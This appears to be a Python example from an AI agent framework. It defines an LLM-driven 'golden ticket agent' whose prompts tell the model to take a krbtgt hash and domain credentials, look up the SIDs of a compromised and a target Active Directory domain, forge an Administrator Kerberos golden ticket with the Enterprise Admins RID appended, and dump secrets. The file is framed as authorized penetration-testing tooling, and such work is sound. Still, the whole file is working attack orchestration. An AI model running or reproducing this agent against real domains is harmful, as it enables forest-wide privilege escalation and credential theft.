import rigging as rg
from armada import Agent
from armada.examples.kali.tools.kali.kali_tools import (
    generate_golden_ticket,
    get_sid,
)


class GoldenTicketAgent(Agent):
    name = "golden ticket agent"
    pipeline = (
        rg.get_generator("gpt-4.1")
        .chat(
            [
                {
                    "role": "system",
                    "content": """
You are a specialized golden ticket agent designed to generate golden tickets for authorized Active Directory penetration testing environments.

Your goal is to create a golden ticket for Administrator and dump secrets on the target domain.

The steps are as follows:
- Get the SID of the compromised domain using the get_sid tool.
- Get the SID of the target domain using the get_sid tool.
- Generate a golden ticket for Administrator using the generate_golden_ticket tool.
""",
                },
            ]
        )
        .using(get_sid)
        .using(generate_golden_ticket)
    )

    def prompt(
        self,
        krbtgt_hash: str,
        user_name: str,
        password: str,
        compromised_domain: str,
        target_domain: str,
    ) -> str:  # type: ignore
        """Generate a golden ticket and dump secrets on the target domain.

        First, use the get_sid tool to get the SID of the compromised domain {{compromised_domain}}. The username is {{user_name}} and the password is {{password}}. The line with the SID should read "[*] Domain SID is: ..."
        Second, use the get_sid tool to get the SID of the target domain {{target_domain}}. The username is {{user_name}} and the password is {{password}}. The line with the SID should read "[*] Domain SID is: ..."
        You will need to find these two SIDs.

        Then, use the generate_golden_ticket tool to generate a golden ticket for Administrator. The krbtgt hash is {{krbtgt_hash}}. The domain is {{compromised_domain}}. Use the two SIDs that you discovered. You should add 519 to the target domain SID.

        Return confirmation that the golden ticket was generated or not.
        """
